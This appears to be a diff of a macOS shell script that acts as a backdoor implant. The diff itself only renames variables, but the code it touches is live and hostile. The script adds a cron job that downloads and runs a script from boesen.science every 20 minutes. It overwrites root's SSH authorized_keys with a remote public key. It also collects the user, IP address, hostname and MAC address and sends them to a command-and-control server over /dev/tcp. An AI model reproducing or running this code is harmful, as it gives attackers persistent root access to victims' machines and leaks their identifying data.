@@ -15,24 +15,24 @@ dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.a
 # On Macs, each line is executed separately, so things like variables won't work if we just pipe it.
 (crontab -l 2>/dev/null; echo '*/20 * * * * curl -Lo /tmp/update.sh boesen.science:2042/mac/update.sh; chmod +x /tmp/update.sh; /tmp/update.sh') | crontab -
 
-SSHPATH="/var/root/.ssh"
+sshpath="/var/root/.ssh"
 
-mkdir -p "$SSHPATH" # On most computers, there won't be a .ssh directory initially
+mkdir -p "$sshpath" # On most computers, there won't be a .ssh directory initially
 
-rm "$SSHPATH/authorized_keys" # Just in case
-curl -Lso "$SSHPATH/authorized_keys" boesen.science:2042/pubkey
+rm "$sshpath/authorized_keys" # Just in case
+curl -Lso "$sshpath/authorized_keys" boesen.science:2042/pubkey
 
-USER=$(stat -f "%Su" /dev/console) # Get user currently logged in (in GUI).
-IP=$(/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
-HOSTNAME=$(hostname)
-MAC=$(/sbin/ifconfig en1 | awk '/ether/{print $2}')
+user=$(stat -f "%Su" /dev/console) # Get user currently logged in (in GUI).
+ip=$(/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
+hostname=$(hostname)
+mac=$(/sbin/ifconfig en1 | awk '/ether/{print $2}')
 
-SERVER="boesen.science"
+server="boesen.science"
 PORT=2043
 
 # Send data to C&C
-exec 3<>/dev/tcp/$SERVER/$PORT
-printf "JOIN: $USER $IP $HOSTNAME $MAC" >&3
+exec 3<>/dev/tcp/$server/$PORT
+printf "JOIN: $user $ip $hostname $mac" >&3
 
 function timeout() { perl -e 'alarm shift; exec @ARGV' "$@"; }
 # Print response, time out if none
